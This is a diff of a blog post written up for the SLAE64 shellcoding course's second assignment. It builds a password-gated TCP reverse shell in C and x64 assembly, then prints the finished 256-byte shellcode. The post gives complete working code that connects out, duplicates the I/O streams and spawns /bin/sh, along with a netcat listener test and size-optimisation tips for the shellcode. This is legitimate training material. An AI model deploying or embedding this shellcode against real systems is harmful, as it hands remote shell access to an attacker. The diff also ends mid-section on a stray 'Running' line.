@@ -8,9 +8,13 @@ categories = [ "SLAE64", "Assembler", "Shellcode" ]
 tags = [ "shellcode", "assembler", "linux", "x64" ]
 +++
 
-After completing the video lectures of the [Security Tube Linux 64 bit Assembler Expert course (SLAE64)](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html), a series of assessments must be completed to gain certification. This is the second assignment: Create a shellcode string that will start a TCP Reverse Shell. 
+After completing the video lectures of the [Security Tube Linux 64 bit Assembler Expert course (SLAE64)](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html), a series of assessments must be completed to gain certification. This write up is for the second assignment: Create a shellcode string that will start a TCP Reverse Shell. 
 
-A reverse shell connects to a remote listener on a given network address and port. Any commands issued by the remote host are relayed back to a local shell in the same way as the bind shell. Having the target reach out to the remote machine may seem like an odd way of making the connection, especially as the remote must be ready and listening for the connection to be successful. However, this type of connection is preferable if the target is behind a firewall or a network address translation (NAT) layer which would make inbound connections to bind shells difficult. 
+A reverse shell connects to a remote host on a given network address and port. Any commands issued by the remote host are relayed to a local shell on the target in the same way as the bind shell. 
+
+![image](img/revshell.png)
+
+Having the target reach out to the remote machine may seem like an odd way of making the connection, especially as the remote must be ready and listening for the connection to be successful. However, this type of connection is preferable if the target is behind a firewall or a network address translation (NAT) layer which would make an inbound connection to a bind shell difficult. 
 
 As with the bind shell a passphrase must be implemented to add a layer of security to the program.
 
@@ -20,45 +24,418 @@ As with the bind shell a passphrase must be implemented to add a layer of securi
 
 Again, Vivek provided a rough outline of the code in C during the course and this was taken as a base for this assignment.
 
-The full listing of my version of the code is hosted on GitHub: [Bind_Shell.c](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_1/reverse_shell.c).
+The full listing of my version of the code is hosted on GitHub: [Reverse_Shell.c](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_2/reverse_shell.c).
 
-The basic sections of code are:
+As the code for the [bind shell](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_1/bind_shell.c) was covered in detail in the [first assignment](/slae64-01-bind-shell), I won't go into another line by line breakdown. However, it is worth looking at the parts which have changed.
 
-### Variable Definitions and Initialisation
+### Socket parameters
+
+We're connecting out to a remote machine, so the <tt>sockaddr_in</tt> structure has a specific address entry this time. 
 
 {{< highlight c >}}
-// Socket descriptors
-int svr_sock;
-int client_sock;
-
-// Socket definitions
-struct sockaddr_in server;
-struct sockaddr_in client;
-int sockaddr_len = sizeof(struct sockaddr_in);
-
-// Some strings
-char *arguments[] = { "/bin/sh", 0 };
-char *in[] = { "xxxxxxxxxx", 0 };
-bzero(&in, 10);
-
-// Loop flag
-int connected = 0;
+server.sin_family = AF_INET;    // 2
+server.sin_port = htons(4444);  // 0x5c11
+server.sin_addr.s_addr = inet_addr("127.0.0.1");  // 0x7f000001
+bzero(&server.sin_zero, 8);
 {{</ highlight >}}
+
+We're using the loopback <tt>127.0.0.1</tt> address for this example. Python does not have a <tt>inet_addr()</tt> function to find the hex value of an arbitrary address, but the <tt>inet_aton()</tt> function works in a similar way:
+
+{{< highlight text >}}
+MBP:slae64$ python
+Python 2.7.12 (default, Jun 29 2016, 14:05:02)
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import socket
+>>> socket.inet_aton("192.168.0.200")
+'\xc0\xa8\x00\xc8' 
+{{</ highlight >}}
+
+Remember that the value is a string and will need to be reversed when building the <tt>sockaddr_in</tt> structure in memory.
+
+### Connecting the socket
+
+There is no bind step required for a client socket, we simply reach out to the remote host:
+
+{{< highlight c >}}
+// Connect to remote host       
+if((connect(sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
+{
+    perror("connect: ");
+    exit(-1);
+}
+{{</ highlight >}}
+
+There is no timeout or retry, a 'Connection Refused' error will occur if the target socket is not up, running and able to accept the connection.
 
 ### Validating the user
 
- ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX | Arg4 / R10 | Arg5 / R8 | Arg6 / R9 
-:---------|:-----|:-----------|:-----------|:-----------|:-----------|:-----------|:---------
-44|<tt>sys_sendto</tt>|<tt>int fd</tt>|<tt>void *buff</tt>|<tt>size_t len</tt>|<tt>unsigned flags</tt>|<tt>struct sockaddr *addr</tt>|<tt>int addr_len</tt>
-
+There is no validation retry loop in this code. If an invalid password is returned from the prompt, the connection is dropped and the program exits. Depending on how the remote server is running, the remote socket could also be closed in response to the disconnect. There would be little point in immediately retrying the connection.
 
 {{< highlight c >}}
-SYSCALL_DEFINE4(send, int, fd, void __user *, buff, size_t, len,
-        unsigned, flags)
+// Check password
+send(sock, (char*)"Anyone there?\n", 14, 0);
+read(sock, &in, 10);
+
+if(strncmp("BigSecret", in, 9))
 {
-    return sys_sendto(fd, buff, len, flags, NULL, 0);
+    send(sock, (char*)"Nope\n", 5, 0);
+    exit(-1);
 }
 {{</ highlight >}}
+
+Assuming the password is entered correctly, the rest of the code is much the same as the bind shell. I/O streams are duplicated and a new shell instance is spawned.
+
+### Testing the code
+
+We can set up a listening socket using <tt>netcat</tt>:
+
+{{< highlight text >}}
+codehead@ubuntu:assignment_2$ nc -l 4444
+_
+{{</ highlight >}}
+
+Running the reverse shell code from another terminal, we should see the prompt appear in the <tt>netcat</tt> process:
+
+{{< highlight text >}}
+codehead@ubuntu:assignment_2$ nc -l 4444
+Anyone there?
+NotThePassword
+Nope
+codehead@ubuntu:assignment_2$ nc -l 4444
+Anyone there?
+BigSecret
+Hi!
+pwd
+/home/codehead/SLAE64/assignment_2
+exit
+{{</ highlight >}}
+
+Remember to start the <tt>netcat</tt> listener before running the reverse shell.
+
+## Converting the code to Assembler
+
+We can re-use a good deal of the [Bind_Shell.nasm](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_1/bind_shell.nasm) code to create the reverse shell. However, this time I am making an extra effort to reduce the code size as much as possible.
+
+### Storage Requirements
+
+We will use the stack to store variables again. This time we only need to store one fixed value; the socket ID. 
+
+![image](img/StackBufferRev.png)
+
+The buffers remain the same, even though we only have one <tt>sockadr_in</tt> struct this time.
+
+### Setting up
+
+We'll use the jump, call, pop method to locate the string data within our code:
+
+{{< highlight asm >}}
+_start:
+    mov rbp, rsp
+    jmp short _strdata  ; Find address of string list
+    
+_getref:    
+    pop r15             ; RIP address is the start of string data
+    jmp short _main
+
+_strdata:
+    call _getref        ; Push RIP onto stack
+    prompt: db "?", 0xa
+    pass:   db "BigSecret"
+    good:   db "OK", 0xa
+{{</ highlight >}}
+
+The strings are pretty minimal to reduce the size of the shellcode. In the last assignment, I sacrificed the strings to save space. In the reverse shell, some kind of indication is needed to show an operator that the target has made the connection to the host, so I'm leaving some of the bells and whistles in. 
+
+We include the <tt>_prompt</tt> and <tt>_exit</tt> utility methods again. This time they are optimised to reduce size.
+
+{{< highlight asm >}}
+_prompt:                ; send string to a socket, RSI and RDX populated before call    
+    pop rdi
+    push rdi            ; socket id
+    xor rax, rax    
+    mov r10, rax        ; Zero unused params
+    mov r8, rax
+    mov r9, rax 
+    add al, 44          ; sys_sendto
+    syscall
+    ret
+
+_exit:                  ; exit nicely
+    xor rax, rax
+    push rax
+    pop rbx
+    add al, 0x3c
+    inc ebx
+    mov rsp, rbp
+    syscall 
+{{</ highlight >}}
+
+
+### Intermission: Optimising instruction counts
+
+While trying to reduce the size of the shellcode I discovered quite a few odd things about x64 assembler.
+
+Adding (or subtracting) small values using the <tt>RAX</tt> or <tt>AX</tt> registers is a 4 byte instruction. Using <tt>AL</tt> cuts that in half.
+
+{{< highlight text >}}
+48 83 c0 10        add rax,0x10     
+83 c0 10           add eax,0x10 
+66 83 c0 10        add ax, 0x10 
+80 c4 10           add ah, 0x10     
+04 10              add al, 0x10     
+{{</ highlight >}} 
+
+Unfortunately, the same cannot be said for the <tt>RBX</tt>, <tt>RCX</tt> and <tt>RDX</tt> registers. Although, we can still save a byte by favouring the extended register.
+
+{{< highlight text >}}
+48 83 eb 10        sub rbx,0x10                 
+83 eb 10           sub ebx,0x10                 
+66 83 eb 10        sub bx, 0x10                  
+80 ef 10           sub bh, 0x10                  
+80 eb 10           sub bl, 0x10                  
+{{</ highlight >}}
+
+Index registers don't have high byte access, but the extended register is still clearly the best option.
+
+{{< highlight text >}}
+48 83 c6 10        add rsi,0x10             
+83 c6 10           add esi,0x10             
+66 83 c6 10        add si, 0x10       
+40 80 c6 10        add sil,0x10       
+{{</ highlight >}}
+
+Increments and decrement operations are also best used on the 32bit classes to help avoid carry issues. This applies for most registers.
+
+{{< highlight text >}}
+48 ff c0           inc rax                
+ff c0              inc eax                
+66 ff c0           inc ax                 
+fe c0              inc al                 
+fe c4              inc ah 
+
+ff cb              dec ebx
+ff c9              dec ecx
+ff ce              dec esi
+ff cf              dec edi
+{{</ highlight >}}
+
+Accessing the extra x64 registers is quite verbose and nowhere near as efficient:
+
+{{< highlight text >}}
+49 83 c1 10        add r9,0x10 
+41 83 c1 10        add r9d,0x10
+66 41 83 c1 10     add r9w,0x10
+41 80 c1 10        add r9b,0x10
+41 fe c1           inc r9b      
+{{</ highlight >}}
+
+When moving data around, using the stack seems much more preferable to simple <tt>MOV</tt> calls.
+
+{{< highlight text >}}
+48 89 c3           mov rbx,rax                
+              
+50                 push rax                    
+5b                 pop  rbx                      
+{{</ highlight >}}
+
+A <tt>MOV</tt> operation is 3 bytes, using <tt>PUSH</tt>/<tt>POP</tt> is just 2. 
+
+In fact it is often easier to <tt>PUSH</tt> an absolute value onto the stack, then <tt>POP</tt> into the required register than to do an <tt>XOR</tt> and <tt>ADD</tt>.
+
+{{< highlight text >}}
+48 31 c0           xor    rax,rax
+04 10              add    al,0x10
+
+6a 10              push   0x10
+58                 pop    rax
+{{</ highlight >}}
+
+Of course, the x64 registers throw a spanner in the works by requiring two bytes for <tt>PUSH</tt>/<tt>POP</tt>:
+
+{{< highlight text >}}
+41 51              push r9
+41 52              push r10
+41 5e              pop  r14
+41 5f              pop  r15   
+{{</ highlight >}}
+
+These optimisations are small, but when applied over the whole program they can make a big difference. There is no 'one size fits all rule' for reducing the code size, but by selecting the best approach based on the required outcome or re-ordering the operations to make best use of resources, good savings can be made.  
+
+### Creating the socket
+
+Getting back to the code, we'll create and configure socket in the same way as last time. However, this time we need to populate the address field, remembering to build the in-memory string in reverse.
+
+{{< highlight asm >}}
+_main:
+; Build a server sockaddr_in struct on the stack
+    xor rax, rax
+    push rax            ; sin_zero
+    inc eax             ; start the 127.0.0.1 address
+    shl eax, 24         ; pad with three zeros
+    add al, 0x7f        ; overwrite the last zero with 0x7f / 127
+    shl rax, 16
+    add ax, 0x5c11      ; htons(4444)
+    shl rax, 16
+    add al, 2           ; sin_family
+    push rax
+    
+; Create Socket 
+    xor rdi, rdi
+    push rdi
+    push rdi
+    pop rax
+    pop rdx
+    inc edi
+    push rdi
+    pop rsi             ; SOCK_STREAM (1)
+    inc edi             ; AF_INET (2)
+    add al, 41          ; syscall 41
+    syscall
+    cmp rax, -1
+    jle short _exit
+    push rax            ; store socket id on stack
+{{</ highlight >}}  
+
+The <tt>connect</tt> syscall matches the C function:
+
+ ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX 
+:---------|:-----|:-----------|:-----------|:-----------
+42 |<tt>sys_connect</tt>|<tt>int fd</tt>|<tt>struct sockaddr *uservaddr</tt>|<tt>int addrlen</tt>
+
+Because we know that the socket ID is the top value on the stack, we can use the <tt>POP/PUSH</tt> trick to load a register in two bytes rather then the 4 required for a <tt>mov rdi, [rbp-24]</tt> move with stack offset calculation. We also use the <tt>PUSH/POP</tt> absolute assign method to save a few extra bytes here when defining the constants. 
+
+{{< highlight asm >}}
+; Connect to remote host
+    pop rdi
+    push rdi            ; socket id
+    lea rsi, [rbp-16]   ; sockaddr struct
+    push 16
+    pop rdx             ; struct size
+    push 42
+    pop rax             ; sys_connect
+    syscall
+    cmp eax, -1
+    jle short _exit
+{{</ highlight >}}  
+
+Assuming the return in <tt>RAX</tt> (I'm actually using <tt>EAX</tt> to save a byte) is greater than -1, we have a connection to the remote host and can move on to the authentication.
+
+### Authentication
+
+As previously stated, a visual prompt is required to let an operator on the listening host know that an incoming connection has been made. If the listening socket was under the control of some code rather than <tt>netcat</tt>, we could trigger actions on connect, but for the purpose of this exercise, we need to send a 'Hello' message.
+
+The shortest thing I could come up with that still conveyed a request for input was a question mark. So, the prompt for a password is just that: a question mark followed by a newline. The strings start at the address pointed to by <tt>r15</tt> and the length of the string is 2. The <tt>_prompt</tt> function does the rest.
+
+{{< highlight asm >}}
+; Send message
+    mov rsi, r15        ; string address
+    push 2
+    pop rdx             ; string length
+    call _prompt 
+{{</ highlight >}} 
+
+We don't need the <tt>sockaddr_in</tt> data any more, so we overwrite buffer 1 with the input received from the remote host. The socket ID is still top of the stack, so we can use the <tt>POP/PUSH</tt> trick again.
+
+{{< highlight asm >}}
+; Listen for response
+    pop rdi
+    push rdi            ; socket id
+    lea rsi, [rbp-16]   ; buffer address
+    xor rax, rax        ; Zero out registers
+    push rax
+    pop r10
+    mov r8, rax
+    mov r9, rax 
+    push 9
+    pop rdx             ; buffer length
+    add al, 45          ; recvfrom
+    syscall
+{{</ highlight >}}
+
+We covered string checks with <tt>CMPSB</tt> in the [last assessment](/slae64-01-bind-shell), so there is no need to dissect this. However, in the event of a mismatch, the <tt>_exit</tt> function is beyond the reach of a <tt>short</tt> jump, meaning we end up with a big 6 byte instruction. To get around this and extra location named <tt>_end</tt> was added before the final <tt>_exit</tt> call. This brings the jump back into short range and reduces a 6 byte long jump to just 2 bytes. 
+
+{{< highlight asm >}}
+; Check for correct pass phrase
+    lea rsi, [rbp-16]   ; input buffer address
+    lea rdi, [r15+2]    ; password string address
+    push 9
+    pop rcx             ; length
+_cmploop:
+    cmpsb               ; compare bytes
+    jne short _end      ; exit if no match
+    loop _cmploop       ; next char 
+{{</ highlight >}}
+
+Assuming the password is validated, all that is left to do is set up the shell as before. These methods have been optimised for size, but the functionality is identical.
+
+{{< highlight asm >}}
+; good passphrase (fallthrough)
+    lea rsi, [r15+11]   ; OK string
+    push 3
+    pop rdx             ; welcome length
+    call _prompt
+
+; Duplicate I/O descriptors
+    xor rax, rax    
+    pop rdi
+    push rdi            ; socket id
+    push rax
+    pop rsi             ; 0 = STDIN
+    add al, 33          ; dup2  
+    push rax            ; keep syscall id
+    syscall 
+
+    pop rax             ; dup2
+    push rax
+    inc esi             ; 1 = STDOUT
+    syscall
+
+    pop rax             ; dup2
+    inc esi             ; 2 = STDERR
+    syscall
+    
+; spawn a shell
+    xor rax, rax
+    push rax
+    pop rdx        
+    mov rbx, 0x68732f6e69622f78 ; build X/bin/sh
+    shr rbx, 8          ; shift the ¨X¨ and append a NULL
+    mov [rbp-16], rbx   ; copy ¨/bin/sh¨ string to buffer
+    lea rdi, [rbp-16]   ; get the /bin/sh string
+    push rax            ; build args array, by pushing NULL
+    push rdi            ; then pushing string address
+    mov rsi, rsp        ; args array address
+    add al, 59          ; execve
+    syscall
+_end:
+    call _exit  
+{{</ highlight >}}
+
+Note the <tt>_end</tt> label between the <tt>execve</tt> syscall and the final call to <tt>_exit</tt>.
+
+## Shellcode conversion and testing
+
+As with the reverse shell, this code contains inline string data which confuses the [Commandline Fu](http://www.commandlinefu.com/commands/view/12151/get-shellcode-of-the-binary-using-objdump) shellcode extractor. So the raw hex was extracted with my [Hexdump script](https://github.com/CodeheadUK/SLAE64/blob/master/misc/shellcode_extract.sh).
+
+The resulting shellcode comes in at 256 bytes which is pretty good, even with the strings and error checking left in, it is smaller than the cut down version of the reverse shell.
+
+{{< highlight text >}}
+\x48\x89\xe5\xeb\x04\x41\x5f\xeb\x33\xe8\xf7\xff\xff\xff\x3f\x0a\x42\x69\x67\x53
+\x65\x63\x72\x65\x74\x4f\x4b\x0a\x48\x8b\x7d\xe8\x48\x31\xc0\x49\x89\xc2\x49\x89
+\xc0\x49\x89\xc1\x04\x2c\x0f\x05\xc3\x6a\x3c\x6a\x01\x5b\x58\x48\x89\xec\x0f\x05
+\x48\x31\xc0\x50\xff\xc0\xc1\xe0\x18\x04\x7f\x48\xc1\xe0\x10\x66\x05\x11\x5c\x48
+\xc1\xe0\x10\x04\x02\x50\x48\x31\xff\x57\x57\x58\x5a\xff\xc7\x57\x5e\xff\xc7\x04
+\x29\x0f\x05\x83\xf8\xff\x7e\xc5\x50\x5f\x57\x48\x8d\x75\xf0\x6a\x10\x5a\x6a\x2a
+\x58\x0f\x05\x83\xf8\xff\x7e\xb1\x4c\x89\xfe\x6a\x02\x5a\xe8\x91\xff\xff\xff\x5f
+\x57\x48\x8d\x75\xf0\x48\x31\xc0\x50\x41\x5a\x49\x89\xc0\x49\x89\xc1\x6a\x09\x5a
+\x04\x2d\x0f\x05\x48\x8d\x75\xf0\x49\x8d\x7f\x02\x6a\x09\x59\xa6\x75\x49\xe2\xfb
+\x49\x8d\x77\x0b\x6a\x03\x5a\xe8\x5c\xff\xff\xff\x48\x31\xc0\x5f\x57\x50\x5e\x04
+\x21\x50\x0f\x05\x58\x50\xff\xc6\x0f\x05\x58\xff\xc6\x0f\x05\x48\x31\xc0\x50\x5a
+\x48\xbb\x78\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48\x89\x5d\xf0\x48\x8d
+\x7d\xf0\x50\x57\x48\x89\xe6\x04\x3b\x0f\x05\xe8\x31\xff\xff\xff
+{{</ highlight >}}
+
+Running
 
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
@@ -66,4 +443,5 @@ This blog post has been created for completing the requirements of the SecurityT
 http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
 
 Student ID: SLAE64-1471
+
 
